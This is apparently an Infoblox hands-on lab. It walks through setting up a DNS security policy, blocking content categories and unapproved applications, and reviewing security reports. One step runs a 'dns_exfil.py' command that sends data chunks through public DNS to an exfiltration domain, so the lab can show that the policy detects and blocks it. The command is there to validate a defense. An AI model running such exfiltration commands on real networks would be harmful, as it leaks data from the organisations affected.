---
slug: uddi-dns-security
id: s81nsgesxvbl
type: challenge
title: DNS Threat Defense & Data Exfiltration Prevention
teaser: Create and apply DNS security policies to detect and block data exfiltration.
  Leverage Infoblox threat intel and visibility to stop threats like DNS tunneling,
  DGA, and TOR in real-time.
notes:
- type: video
  url: https://videos.infoblox.com/watch/DytGsd2iVoUeVhaqva1kNm?
tabs:
- id: voimnaedmawh
  title: Shell
  type: terminal
  hostname: shell
- id: 4kqdxeedcvvq
  title: Editor
  type: code
  hostname: shell
  path: /root/infoblox-lab
- id: ybwe3xc5iwfw
  title: AWS Console
  type: browser
  hostname: aws
- id: 4j1j1e6ygups
  title: Azure Console
  type: browser
  hostname: azure
- id: 1i3kx1ty4tou
  title: Infoblox Portal
  type: browser
  hostname: infoblox
- id: z6juhcj2bbcc
  title: Lab Diagram
  type: browser
  hostname: lab
difficulty: ""
timelimit: 0
lab_config:
  default_layout_sidebar_size: 0
enhanced_loading: null
---
# 🧠 Challenge: DNS Threat Defense, Shadow IT Discovery & Data Exfiltration Prevention

Welcome to the Infoblox DNS Security & Visibility Challenge. In this challenge, you’ll not only configure and enforce DNS-layer security policies — but also unlock powerful insights into Shadow IT, unauthorized SaaS usage, and emerging threats.

🎯 Objectives
- 🔐 Create and apply custom DNS security policies (Infoblox-Lab)
- 📡 Detect & block DNS-based threats like tunneling, exfiltration, and access to malicious domains
- 📊 Leverage Threat Intelligence Feeds & Content Categories
- 🚨 Observe enforcement results: block, allow, redirect, log — in real time
- 👀 Uncover Shadow IT using Application Discovery: identify unauthorized GenAI & SaaS tools being used inside the org

DNS is more than just resolution — it’s the control plane for app usage, threat prevention, and user behavior visibility.
In this lab, you’ll use it like a pro.

---
Infoblox Product Portoflio is here to help

![Screenshot 2025-07-03 at 20.43.26.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/f938de16b8bb06a0f3714b9cf48e3676/assets/Screenshot%202025-07-03%20at%2020.43.26.png)

##  Login to your cloud account consoles
===

🔐 (Optional) Log in to Your Cloud Account Consoles

You should already be signed in to both the AWS and Azure web consoles via the embedded tabs on the left-hand side of the Instruqt interface.

⚠️ Only perform this step if you’re logged out or the session has expired.

- Use the credentials provided in the lab instructions to sign in.
- Skip any onboarding wizards or tutorials (especially on Azure).
- If prompted for account type on AWS, select IAM Account.

---

---
# AWS Credentials ☁️

Select "IAM Account" and enter the **AWS ID**:
```
[[ Instruqt-Var key="INSTRUQT_AWS_ACCOUNT_INFOBLOX_DEMO_ACCOUNT_ID" hostname="shell" ]]
```

**AWS Username**
```
[[ Instruqt-Var key="INSTRUQT_AWS_ACCOUNT_INFOBLOX_DEMO_USERNAME" hostname="shell" ]]
```

**AWS Password**
```
[[ Instruqt-Var key="INSTRUQT_AWS_ACCOUNT_INFOBLOX_DEMO_PASSWORD" hostname="shell" ]]
```

---

# AZURE Credentials ☁️

**AZURE SUBSCRIPTION**
```
[[ Instruqt-Var key="INSTRUQT_AZURE_SUBSCRIPTION_INFOBLOX_TENANT_SUBSCRIPTION_ID" hostname="shell" ]]
```

**AZURE username**
```
[[ Instruqt-Var key="INSTRUQT_AZURE_SUBSCRIPTION_INFOBLOX_TENANT_USERNAME" hostname="shell" ]]
```

**AZURE password**
```
[[ Instruqt-Var key="INSTRUQT_AZURE_SUBSCRIPTION_INFOBLOX_TENANT_PASSWORD" hostname="shell" ]]
```

---

## 🛠 Step-by-Step Instructions - Security Policy Creation and Activation
==

🔐 Step 4: Create & Apply DNS Security Policy

In this step, you’ll create a DNS policy to block access to specific risky categories — and apply it to the NIOS-X-as-a-Service instance, which will enforce protection for all DNS clients using this resolver.

🎯 Why This Matters:

By applying this policy, you’re enabling DNS threat protection at the edge — with zero agent footprint. This same policy can later be reused across other Infoblox components like Infoblox DFP and Endpoints, providing consistent protection across your entire network fabric.



Login to your Infoblox Portal before moving forward.

### 1. Navigate to Policies
Go to:
`Configure > Security > Policies`

You will see:
- `Default Global Policy` (auto-generated)

Mark the policy and Click Clone

![Screenshot 2025-07-01 at 13.10.50.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/64e42ab5093d0c2c90f5ea9fabda7d66/assets/Screenshot%202025-07-01%20at%2013.10.50.png)

### 2. Edit the Lab Policy

Give it the name `Infoblox-Lab` .

![Screenshot 2025-07-01 at 13.12.34.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/4a8e0a182b7f7bb82c2e0ead1fcd9bad/assets/Screenshot%202025-07-01%20at%2013.12.34.png)

#### On the **General** tab:
Ensure the following are set:
- **Precedence**: `2`
- **All options disabled**: Geolocation, Safe Search, DoH per Policy, Block DNS Rebinding, Local On-Prem Resolution

---

### 3. Configure Policy Rules
Go to the **Policy Rules** tab.

![Screenshot 2025-07-12 at 13.24.10.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/91f41850c7ef2dda3b468546eb688bd8/assets/Screenshot%202025-07-12%20at%2013.24.10.png)

🧠 Threat Intelligence Feeds – What Are You Looking At?

The screenshot above displays Infoblox Threat Intelligence Feeds that have been pre-populated in your DNS Security Policy. These feeds come from Infoblox Threat Insight, as well as select third-party curated sources, and are constantly updated to provide real-time protection against:
- Malware command-and-control (C2) domains
- Phishing and fraudulent websites
- Botnet traffic
- DNS tunneling/exfiltration (e.g., DGA-based threats)
- Newly registered or suspicious domains (zero-day threats)

🔍 These feeds are backed by Infoblox Cyber Intelligence Unit (CIU), leveraging advanced machine learning, behavior analytics, and partnerships with global threat data providers.

> [!NOTE]
You can view the feed names and change their action (e.g., Allow, Block, Redirect) per policy needs. This gives you flexibility to match your enterprise security posture.

Link to the full Infoblox [Threat Intelligence Feed documentation](https://docs.infoblox.com/space/BloxOneThreatDefense/251363483/Threat+Intelligence+Feeds)

⸻

🔧 Next Step: Configure Rule 16

Locate Rule 16 in the policy list and configure it exactly as shown in the image below.


> [!NOTE]
> 📸 Click on the screenshot to zoom in and carefully review the correct configuration settings for Rule 16.

⸻


![Screenshot 2025-07-01 at 13.14.01.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/e583320faf9007d7741976b520ff4342/assets/Screenshot%202025-07-01%20at%2013.14.01.png)

### 4. Add new rule
Go to the **Add Rule** menu in the top and select Category Filter

![Screenshot 2025-07-01 at 13.15.53.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/99c0ee7cde5b4ebf9e12afce37108a03/assets/Screenshot%202025-07-01%20at%2013.15.53.png)

Scroll down to the new added line **Category Filter** and from the drop-down list click on **New Category Filter**

![Screenshot 2025-07-08 at 08.21.17.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/538da44b10a06e2068fad8341ab29d52/assets/Screenshot%202025-07-08%20at%2008.21.17.png)

In the top of the new window give it the name **Adult** and from **Categories** section select and move with the arrow Adult to **Selected** Section

![Screenshot 2025-07-08 at 08.21.38.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/184b8ece291d23670db5d90c3817ecac/assets/Screenshot%202025-07-08%20at%2008.21.38.png)

⸻

🧠 What Are Content Categories?
Content Categories in Infoblox Security Policies allow you to group and filter DNS queries based on the type of content the destination domain hosts — such as Adult, Gambling, Malware, Social Media, etc.

📦 Where Does the Data Come From?
Infoblox leverages curated threat intelligence feeds from internal research, commercial partners, and global telemetry (including Infoblox Threat Defense’s own data pipeline) to classify domains into these categories. These feeds are constantly updated to reflect newly discovered threats and shifting content types.

🛡️ Why It Matters
This helps enforce acceptable use policies, prevent access to risky or non-compliant websites, and reduce exposure to malware, phishing, or C2 infrastructure often hidden behind these categories.

⸻


Click** Add** button at the bottom.

Make sure that setting for this is Block No Redirect as on the picture below

![Screenshot 2025-07-01 at 13.17.43.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/cf5c168e10424e9812a00da472138b3b/assets/Screenshot%202025-07-01%20at%2013.17.43.png)

### 4. Save and Finish
Click **Next**, then **Finish** to save your policy configuration.

### 2. Assign the Policy to a Service

#### Navigate to:
`Configure > Service Deployment > As-A-Service`

![Screenshot 2025-07-01 at 13.20.07.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/8e5d05ef510128814d7d92a3d798ae5b/assets/Screenshot%202025-07-01%20at%2013.20.07.png)

You should see a previously deployed service instance (e.g., Test in the example below). In your lab, this will reflect the name you configured during an earlier deployment step.

![Screenshot 2025-07-01 at 13.20.20.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/02892ca97bab908e90672ed37171962d/assets/Screenshot%202025-07-01%20at%2013.20.20.png)

---

### 3. Edit the Security Service Profile

1. Click the Security service.
2. Click the three-dot menu → **Edit**.


![Screenshot 2025-07-01 at 13.20.30.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/c3ad0845fe2f011145fdd804ab3da38b/assets/Screenshot%202025-07-01%20at%2013.20.30.png)

3. Click on **Security** under **Service Capabilities Section**
4. From the **Profile** dropdown, choose your custom policy (e.g., `Infoblox-Lab`)

---

### 4. Add the Security Capability

1. Under **Service Capabilities**, click **Add**
2. For **Type**, select: `Security`

> [!IMPORTANT]
> NOTE: Steps 1 and 2  - has to be done now ONLY  if you skipped these steps during the previous challenge when creating the NIOS-as-a-Service deployment, make sure to add it now.

3. From the **Profile** dropdown, choose your custom policy (e.g., `Infoblox-Lab`)
4. Click **Update Capability**

![Screenshot 2025-07-01 at 13.20.39.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/00ce251352ddcaa123c3e3e3f5b85ecb/assets/Screenshot%202025-07-01%20at%2013.20.39.png)

![Screenshot 2025-07-01 at 13.20.46.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/2443ca627e328bdbe77d6d9721d9b3d5/assets/Screenshot%202025-07-01%20at%2013.20.46.png)


### 5. Save the Configuration

1. Review the service deployment (ensure it’s using correct location and policy).
2. Click **Save**.

![Screenshot 2025-07-01 at 13.20.56.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/33e4ff1cc7452939cdca34cf896eef33/assets/Screenshot%202025-07-01%20at%2013.20.56.png)

🎉 Your DNS policy is now actively protecting the assigned service!





## 🧪DNS Policy Validation: Blocking Threats & Risky Domains
==

Now that your policy is active, let’s verify two things:
1. 🚫 Risky domain filtering is working (e.g., gambling, adult, anonymizers)
2. 🔒 DNS exfiltration attempts are actively blocked

---

### Step 1: Access the EC2 Instance

From the **Shell tab** in your lab, run the following:

```run
cd ~/infoblox-lab/secure-ai-infoblox/terraform
terraform output
```

This will show you the SSH command to access the EC2 instance.

![Screenshot 2025-07-01 at 13.37.20.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/f72fb1c74b7fb04e90c2d623448bc434/assets/Screenshot%202025-07-01%20at%2013.37.20.png)

> [!IMPORTANT]
> NOTE:Please use your specific SSH command from the `terraform output` to access the instance.

```
ssh -i 'EU_WEST_WebProd1.pem' ec2-user@35.177.254.177
```

![Screenshot 2025-07-01 at 13.39.13.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/1356e48269998e5d3e923b8fccb1c51a/assets/Screenshot%202025-07-01%20at%2013.39.13.png)

### Step 2: Check DNS Settings

Once inside the EC2 host, confirm it’s using the Infoblox DNS server:

```
cat /etc/resolv.conf
```

![Screenshot 2025-07-01 at 13.39.54.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/a9bdf0f65c4ad5b23244069f37c8394a/assets/Screenshot%202025-07-01%20at%2013.39.54.png)

> [!IMPORTANT]
> ✅ You should see: 10.10.10.3


### Step 3: Basic DNS Resolution Test

Try resolving a known domain:

```
dig infoblox.com
```

You should receive a valid response ✅.

![Screenshot 2025-07-01 at 13.52.30.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/a11e9035382fa6785a058eed36f5348f/assets/Screenshot%202025-07-01%20at%2013.52.30.png)

Now try resolving a blocked domain (e.g., adult content):

```
dig bet365.com
```

You should see
status: NXDOMAIN

![Screenshot 2025-07-01 at 13.53.36.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/49775eb5033ba87d8c0008e306649129/assets/Screenshot%202025-07-01%20at%2013.53.36.png)

⛔ Confirming the policy is blocking it.


### Step 4: Simulate DNS Exfiltration

Use the test script to simulate exfiltration via Google DNS (expected to succeed):

```
python3 dns_exfil.py --resolver 8.8.8.8 --domain exfil.highvelocitynetworking.com --chunks 30
```

☠️ Result: You should see successful exfiltration.

![Screenshot 2025-07-01 at 13.43.42.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/d36ec2c2e33e3e1cd5c3d2c5288ca625/assets/Screenshot%202025-07-01%20at%2013.43.42.png)



Now test again using Infoblox DNS:

```
python3 dns_exfil.py --resolver 10.10.10.3 --domain exfil.highvelocitynetworking.com --chunks 30
```

> [!IMPORTANT]
> ⚠️ Important: Infoblox Threat Insight is designed to identify exfiltration behavior based on pattern recognition over time — not on a single burst.


🔁 Run the command 2–3 times, waiting ~30 seconds between each run.

After multiple attempts, Infoblox will begin to classify the domain as malicious and apply adaptive blocking.


🔒 Result: All queries should be blocked or return NXDOMAIN.


•	The first run may return valid responses.

•	By the second or third run, you should start seeing:

•	NXDOMAIN responses

•	DNS queries getting dropped

•	The domain flagged in Threat Insight view

This confirms that Infoblox’s real-time DNS analytics engine has detected the abnormal exfiltration pattern and is now actively blocking the threat — even without prior domain knowledge.




![Screenshot 2025-07-01 at 13.43.12.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/3bceaf9ee5917cd02fb3a01948d44de8/assets/Screenshot%202025-07-01%20at%2013.43.12.png)


## 📈 DNS Visibility, Threat Auditing & Shadow IT Insights( Policy Enforcement & Dossier )
==

Now that we've enforced DNS policy on the client side, it's time to **verify visibility and security enforcement in the Infoblox UI**.

Infoblox UDDI Portal provides detailed telemetry and context on every DNS security decision — from exfiltration attempts to blocked domains by category.

---

### 🔍 Step 1: Navigate to the Security Monitoring Panel

Go to:

Monitor > Reports > Security

![Screenshot 2025-07-01 at 14.02.16.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/155124f7a0e19ae18f497e6ab54ec019/assets/Screenshot%202025-07-01%20at%2014.02.16.png)

Key views:
- `Security Dashboard`
- `Security Activity`
- `Threat Intel`
- `Web Content`
- `DNS Activity`


---

### 🚨 Step 2: Inspect Blocked Threat Activity

Navigate to:

Monitor > Reports > Security > Security Activity > Security Events

![Screenshot 2025-07-01 at 14.02.35.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/bb21b0273f6d7ac929f8e664a5e8c956/assets/Screenshot%202025-07-01%20at%2014.02.35.png)

Here, you’ll see all DNS queries flagged by **Threat Intelligence Feeds** (e.g., data exfiltration attempts).

✅ These were blocked by the **"Infoblox-Lab"** policy with **NXDOMAIN** responses.

---

### 🔞 Step 3: Review Category-Based Blocking (e.g., Gambling, Adult)

Navigate to:

Monitor > Reports > Security > Security Activity > Web Content

This view displays domains that were blocked based on their **web content category**, such as:
- `Pornography`
- `Gambling`
- `VPN / Proxy`
- `Cryptocurrency`

![Screenshot 2025-07-01 at 14.03.06.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/9c812f8f286b5aae25fd18f4f604a51d/assets/Screenshot%202025-07-01%20at%2014.03.06.png)


---

### 🧠 Step 4: Inspect Threat Feeds in Use

Navigate to:

Monitor > Reports > Security > Security Activity > Threat Insight


You can correlate threat classifications (e.g., `TI-DNSTN`, `DGA`, etc.) and confidence scores, showing **why** queries were blocked.


![Screenshot 2025-07-01 at 14.03.18.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/e23b67e12a3926e072e4a6257e45ee29/assets/Screenshot%202025-07-01%20at%2014.03.18.png)

---

### 🧩 Step 5: Discover Shadow IT and Monitor AI Tool Usage via Application Discovery

Infoblox Threat Defense does more than enforce DNS policy — it gives you real-time visibility into application usage across your environment based solely on DNS behavior.

✅ This is perfect for detecting unauthorized cloud apps, enforcing AI usage policies, or tracking SaaS adoption — no agent required.

---

🧠 What is Application Discovery?

Application Discovery identifies which applications are being used within your network, based on observed DNS queries. It maps known FQDN patterns to specific applications using signatures curated by Infoblox.

This allows you to:
- Identify apps like ChatGPT, Dropbox, TikTok, or Slack
- Categorize usage (AI, Cloud Storage, Consumer, Business Tools)
- Highlight unsanctioned or unapproved applications
- Detect early signs of shadow IT or data egress

---

🔍 View Application Insights

You’ll see multiple views:
- ✅ Top Applications Used (ChatGPT, Claude, Bard, etc.)
- ✅ Application Categories (Generative AI, Cloud Backup, VPN/Proxies)
- ✅ Requests per App
- ✅ Devices initiating those requests

---

📊 View Detected Applications

📍 Navigate to the Infoblox Portal

From your Instruqt lab window, click on the browser tab labeled “Infoblox Portal” — this will land you on the login page.

Log in using your provided credentials.

Once inside the portal, follow the path:

**Monitor → Reports → Security → Application Discovery**

![Screenshot 2025-07-12 at 18.34.20.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/7f8842d8f724c502621184f11663eeff/assets/Screenshot%202025-07-12%20at%2018.34.20.png)

![Screenshot 2025-07-12 at 18.34.55.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/7e45583e1286a4e54d13ef0a2edba5a4/assets/Screenshot%202025-07-12%20at%2018.34.55.png)


If you click on on Summary tab this takes you to the Application Discovery Dashboard. You’ll see:

Needs Review – Applications detected but not reviewed
- Approved/Unapproved – Governance status
- Top Categories – Generative AI, Chatbots, Storage, etc.


![Screenshot 2025-07-12 at 18.34.40.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/246d96935d11367f14c0f18a291827e1/assets/Screenshot%202025-07-12%20at%2018.34.40.png)

---
📍 Mark Applications as Unapproved & Enforce Policy

Let’s tighten the screws on risky or unvetted applications.

Click on the Needs Review count, as shown in the screenshot below.

![Screenshot 2025-07-12 at 19.46.15.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/1826739ad0ebc838e1d456915b7673d2/assets/Screenshot%202025-07-12%20at%2019.46.15.png)

Select all applications in the list, then click the Change Status drop-down menu and choose Unapproved.

![Screenshot 2025-07-12 at 19.38.53.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/f1b6246ae08753db79d2276dfde8c610/assets/Screenshot%202025-07-12%20at%2019.38.53.png)

✅ This marks them as unapproved and ready for enforcement.

---

🔐 Apply Enforcement via Policy Rules

1.	Go to:
Configure → Security → Policies

![Screenshot 2025-07-12 at 19.12.32.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/12bcdf65e7b0678bcd5ef33dc4f40d4d/assets/Screenshot%202025-07-12%20at%2019.12.32.png)

2.	Click the three dots next to your policy (e.g., Infoblox-Lab) → Edit.

3.	Under Policy Rules, click Add Rule.

![Screenshot 2025-07-12 at 19.13.09.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/1502d2fecec52d8a81003f46d83788f5/assets/Screenshot%202025-07-12%20at%2019.13.09.png)

4.	Choose Application Filter, then select:
**All Unapproved Applications**

Set Action to:
**Block – No Redirect**

![Screenshot 2025-07-12 at 19.13.16.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/41ee99260620fb10cf0760784a972c93/assets/Screenshot%202025-07-12%20at%2019.13.16.png)

![Screenshot 2025-07-12 at 19.13.25.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/735cdff9438869d4ced0d390c05a0e29/assets/Screenshot%202025-07-12%20at%2019.13.25.png)

5. Move the Application Filter rule to the top of the policy rule list, as shown in the screenshot below. This ensures it takes precedence over other rules.

![Screenshot 2025-07-12 at 19.53.43.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/fbdd5615462a14b053c81fc5a5dae34e/assets/Screenshot%202025-07-12%20at%2019.53.43.png)

6.	Click Finish at the bottom of the policy configuration wizard.
7.	On the next screen, click Save & Close to apply the changes.

![Screenshot 2025-07-12 at 19.53.53.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/fe653f5b2e8bee22ca44ec2a0e26127c/assets/Screenshot%202025-07-12%20at%2019.53.53.png)


That’s it. 🚫 Unapproved apps are now actively blocked.

⏳ It may take a few minutes for enforcement to kick in. Once ready, you can observe the policy in action.

👉 Navigate to Monitor > Reports > Security > Security Activity to view blocked application traffic and DNS queries flagged by your policy.

![Screenshot 2025-07-12 at 19.39.13.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/d713522c62cc31948b5285629cb9132d/assets/Screenshot%202025-07-12%20at%2019.39.13.png)

🎯 Now, to inspect which domains are being blocked:
1.	Go back to Application Discovery under Monitor > Reports > Security.
2.	In the Applications tab, locate any app marked as Blocked.
3.	Click the small target icon for blocked application

![Screenshot 2025-07-12 at 20.00.30.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/abf8ee2109909981e109fb9986140788/assets/Screenshot%202025-07-12%20at%2020.00.30.png)


🧭 This opens a detailed Dossier view — Infoblox’s threat intelligence portal.


![Screenshot 2025-07-12 at 20.01.26.png](https://play.instruqt.com/assets/tracks/atmmwsclkofd/ec2c1f58573fab1a7c4529a66c6c6e6c/assets/Screenshot%202025-07-12%20at%2020.01.26.png)

Here, users can:

- 📊 View DNS request volume for that domain
- 🛡️ See threat classifications, such as malware, phishing, or data exfiltration
- 🔎 Investigate TLD reputation, nameserver risk, and related domains
- 🚨 Correlate the activity with impacted devices and timelines


🔍 Use this to tell a compelling story about app risk and user behavior — Dossier bridges visibility and threat context like no other.


## ✅ Final Wrap-Up: DNS Security + Application Visibility = Full Control
==


You’ve just completed one of the our DNS-layer security labs — and validated an end-to-end story that combines threat protection, shadow IT detection, and real-time insights.

⸻

🔐 Policy Enforcement
- ✅ Applied a custom DNS security policy (Infoblox-Lab)
- ✅ Enforced category-based filtering (e.g., Adult, Gambling)
- ✅ Blocked DNS exfiltration attempts using curated threat intel feeds

🔎 Visibility & Intelligence
- ✅ Confirmed DNS resolver assignment via DHCP
- ✅ Explored detailed telemetry in the Infoblox Portal (Security Events, DNS Activity, Web Content)
- ✅ Unlocked deep visibility into Shadow IT and unauthorized SaaS usage via Application Discovery

⸻

🧠 Why This Matters

DNS isn’t just a protocol — it’s your most strategic visibility layer.

With Application Discovery, you now:
- ✅ Identify who’s using tools like ChatGPT, Claude, Slack, and more — even if IT never approved them
- ✅ Detect risky apps or SaaS services without endpoint agents
- ✅ Combine DNS-layer enforcement with rich user behavior insights

⸻

🛡️ Welcome to next-gen DNS security — where control, context, and visibility come together.

Infoblox gives you the power to not just see everything, but to act on it. 💥

---

## Time for the Next Challenge

Click **NEXT**!
